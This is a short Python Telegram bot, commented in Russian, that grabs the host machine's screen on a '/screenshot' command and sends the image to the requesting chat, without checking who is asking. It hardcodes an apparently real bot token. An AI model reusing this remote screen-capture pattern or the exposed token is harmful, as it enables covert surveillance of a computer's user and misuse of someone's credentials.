import http
import pyscreenshot
import base64
import time
from telebot import TeleBot, types
from PIL import Image
from pyautogui import screenshot

# Замените TOKEN на токен вашего бота Telegram
bot = TeleBot('7028173119:AAHuAHboUsNUEVjBqOJg_BTg6oqVw6sYNmI')
http_client = http.client.HTTPSConnection('api.telegram.org', timeout=60)
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 'Привет! Я могу сделать скриншот вашего экрана.')

@bot.message_handler(content_types=['text'])
def take_screenshot(message):
    if message.text == '/screenshot':
        # Делаем скриншот
        image = pyscreenshot.grab() 
        image.save("screenshot.png") 
        img = open('screenshot.png', 'rb')
        bot.send_photo(message.chat.id, img)

bot.polling()
